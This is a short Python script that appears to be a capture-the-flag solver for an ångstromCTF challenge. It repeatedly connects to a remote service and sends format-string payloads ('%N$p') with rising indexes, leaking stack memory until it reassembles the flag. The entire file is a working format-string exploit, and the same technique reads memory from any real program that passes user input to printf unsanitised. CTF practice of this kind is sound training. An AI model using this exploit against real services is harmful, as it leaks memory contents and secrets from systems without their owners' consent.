import socket
import time


def flush(sock):
    time.sleep(0.05)
    return sock.recv(2048)


def process_response(res):
    text = res.strip()
    text = text.split(b", ")[1].lstrip(b"0x")
    text = text.decode().zfill(16)
    text = reversed(bytes.fromhex(text))
    text = bytearray(text)
    return text


if __name__ == "__main__":
    i = 0
    flag = b""

    while b"actf{" not in flag:
        i += 1
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("shell.actf.co", 21820))

        flush(sock)

        payload = f"%{str(i)}$p\n"
        print(f"Trying payload: {payload}", end="")

        sock.send(payload.encode()) 

        try:
            flag = process_response(flush(sock))
        except:
            flag = b""
            continue
    
    print(f"Start of flag found with payload {payload}")

    while b"}" not in flag:
        i += 1
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("shell.actf.co", 21820))

        flush(sock)

        payload = f"%{str(i)}$p\n"

        sock.send(payload.encode()) 

        flag += process_response(flush(sock))
        print(flag)

    print(flag.decode())
